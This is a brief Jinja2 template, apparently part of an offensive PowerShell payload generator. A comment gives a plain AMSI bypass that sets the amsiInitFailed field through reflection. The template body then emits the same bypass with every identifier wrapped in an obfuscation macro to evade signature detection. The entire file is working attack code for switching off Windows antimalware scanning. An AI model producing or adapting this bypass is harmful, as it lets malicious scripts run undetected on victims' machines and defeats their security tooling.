{%- from 'macros.jinja2' import obfuscate with context -%}
{# [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true) #}
[Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}.Invoke({{obfuscate("System.Management.Automation.AmsiUtils")}}).{{obfuscate("GetField")}}.Invoke({{obfuscate("amsiInitFailed")}},{{obfuscate("NonPublic,Static")}}).{{obfuscate("SetValue")}}.Invoke($null,$true);
